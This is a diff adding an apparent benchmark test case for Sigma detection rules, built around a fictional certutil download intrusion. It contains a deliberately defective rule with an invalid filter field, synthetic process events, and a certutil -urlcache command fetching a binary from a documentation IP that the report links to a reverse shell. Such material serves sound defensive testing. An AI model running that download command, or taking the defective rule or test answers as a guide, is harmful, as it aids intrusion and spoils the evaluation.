@@ -1,0 +1,113 @@
+id: D3-04
+role: defective
+defect_class: D3
+evasive: true
+why: The positive selection uses only allowed fields, but the negated filter selection filter_patch_agent
+  uses ParentProcessName, which is not an allowed process_creation field (ParentImage is); the invented
+  field appears only inside 'not filter_patch_agent'.
+expected_gate: G5
+report_text: A threat report on the fictional Wickham Textiles intrusion describes ingress tool transfer
+  using certutil. The operator ran certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin
+  C:\Users\Public\agent.bin from an interactive cmd.exe session to pull a second-stage binary. Because
+  certutil is also used on these hosts by the corporate patch agent for certificate refresh, the report
+  notes that patchagent.exe legitimately launches certutil.exe but only with the -verify or -store switches
+  and never with -urlcache. The responders therefore recommend flagging certutil.exe with the -urlcache
+  switch together with -split, while excluding children of patchagent.exe. The downloaded binary was executed
+  minutes later and established a reverse shell. Four other hosts showed the same command line with different
+  file names.
+evidence:
+- certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin C:\Users\Public\agent.bin
+- flagging certutil.exe with the -urlcache switch together with -split, while excluding children of patchagent.exe
+logsource: windows_process_creation
+techniques:
+- T1105
+sigma_yaml: |
+  title: Certutil Urlcache Download Outside Patch Agent
+  id: e2096b47-3f58-4a1c-b7d9-0c84a5e63f12
+  status: experimental
+  description: Detects certutil downloading a remote file with the urlcache and split switches, excluding children of the corporate patch agent.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: process_creation
+    product: windows
+  detection:
+    selection:
+      Image|endswith: '\certutil.exe'
+      CommandLine|contains|all:
+        - '-urlcache'
+        - '-split'
+    filter_patch_agent:
+      ParentProcessName|endswith: '\patchagent.exe'
+    condition: selection and not filter_patch_agent
+  falsepositives:
+    - Administrators downloading files with certutil for troubleshooting
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://198.51.100.40/stage/agent.bin C:\Users\Public\agent.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -urlcache -split -f http://198.51.100.40/stage/helper.bin C:\Users\Public\helper.bin
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\PING.EXE
+    cmd: ping.exe 192.0.2.1
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\carol
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\tasklist.exe
+    cmd: tasklist.exe /svc
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -store My
+    parent: C:\Program Files\CranePatch\patchagent.exe
+    parent_cmd: patchagent.exe --refresh
+    user: NT AUTHORITY\SYSTEM
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\certutil.exe
+    cmd: certutil.exe -hashfile C:\Temp\setup.msi SHA256
+    parent: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    parent_cmd: powershell.exe
+    user: LAB\dave
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
